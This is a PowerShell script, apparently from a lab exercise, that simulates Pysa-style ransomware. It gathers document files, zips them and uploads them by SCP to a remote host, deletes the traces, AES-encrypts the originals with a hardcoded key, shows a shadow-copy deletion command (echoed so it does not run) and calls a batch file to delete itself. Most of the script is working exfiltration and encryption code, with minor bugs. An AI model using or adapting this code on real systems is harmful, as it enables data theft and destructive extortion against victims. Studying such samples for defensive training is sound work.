<#
    Storyline: The script search the filesystem  for docx, xlsx, pdf, and txt files 
    and copy those to a new folder. This folder is then zipped and sent off
    to a remote host and deleted off the current machine. The orginal files
    are then encrypted. The volume shadow and restore points are then deleted.
    And update.bat is run to delete the script.
#>

# Start new ssh session
# New-SSHSession -ComputerName '192.168.6.71' -Credential (Get-Credential 'blaise.notter@cyber.local') -Port '2222'

# Locate files to be extracted
$fileList = Get-ChildItem -Recurse -Include *.docx,*.pdf, *.xlsx, *.txt -Path .\Documents 

# Create a new folder in temp
New-Item -Path "C:\Windows\Temp\" -Name "UnEncrypted" -ItemType "directory"

$UnencFiles = "C:\Windows\Temp\UnEncrypted"

# Loop through the files and add them to a new folder
foreach ($f in $fileList) 
{
    Copy-Item $f.FullName  -Destination $UnencFiles
}

# Zip the newly created folder
Compress-Archive -Path $UnencFiles -DestinationPath $UnencFiles

# Delete the unzipped folder 
Remove-Item -Path $UnencFiles -Recurse


# Upload a file to remote host
Set-SCPItem -ComputerName '192.168.6.71' -Port '2222' -Credential (Get-Credential 'blaise.notter@cyber.local') `
-Destination '/home/blaise.notter' -Path 'C:\Windows\Temp\UnEncrypted.zip'

if ((Invoke-SSHCommand -index 0 'dir UnEncrypted.zip').ExitStatus -eq 0 ) {
    
    write-host -backgroundcolor "Green" -foregroundcolor "Black" "File uploaded sucessfully!"

} else {

    write-host -backgroundcolor "Red" -foregroundcolor "Black" "File upload failed!"

}

# Delete the Zip off the host
Remove-Item -Path "C:\Windows\Temp\UnEncrypted.zip"


<#
.SYNOPSIS
Encryptes or Decrypts Strings or Byte-Arrays with AES
 
.DESCRIPTION
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
 
.PARAMETER Mode
Encryption or Decryption Mode
 
.PARAMETER Key
Key used to encrypt or decrypt
 
.PARAMETER Text
String value to encrypt or decrypt
 
.PARAMETER Path
Filepath for file to encrypt or decrypt
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
 
Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".pysa"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

Get-ChildItem -Recurse -Include *.docx,*.pdf, *.xlsx -Path .\Documents | export-csv `
-Path files.csv 

# Import CSV file.
$filesList = Import-Csv -Path .\files.csv -Header FullName

# Loop through the results
foreach ($fs in $filesList) {

    Invoke-AESEncryption -Mode Encrypt -Key "V3locirapt0r" -Path $f.FullName
    
}

# Delete the volume shadow copies and restore points
# I have this command echoed because I do not want to run it on my own machine
echo 'Write-Host "vssadmin delete shadows /all /quiet"'

# Run the update.bat file to delete step2.ps1
Invoke-Expression ".\update.bat"